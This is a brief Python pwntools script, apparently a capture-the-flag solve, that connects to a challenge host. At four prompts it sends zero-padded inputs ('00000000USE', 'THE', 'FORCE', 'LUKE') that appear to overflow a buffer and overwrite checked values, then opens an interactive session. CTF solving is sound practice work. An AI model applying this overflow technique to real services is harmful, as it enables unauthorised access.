#!/usr/bin/python3
from pwn import *

io = remote("spaceheroes-checkpoint.chals.io", 443, ssl=True, sni="spaceheroes-checkpoint.chals.io")


io.recvuntil(b"Your response: ")
io.sendline(b"00000000USE")

io.recvuntil(b"Your response: ")
io.sendline(b"00000000THE")

io.recvuntil(b"Your response: ")
io.sendline(b"00000000FORCE")

io.recvuntil(b"Your response: ")
io.sendline(b"00000000LUKE")

io.interactive()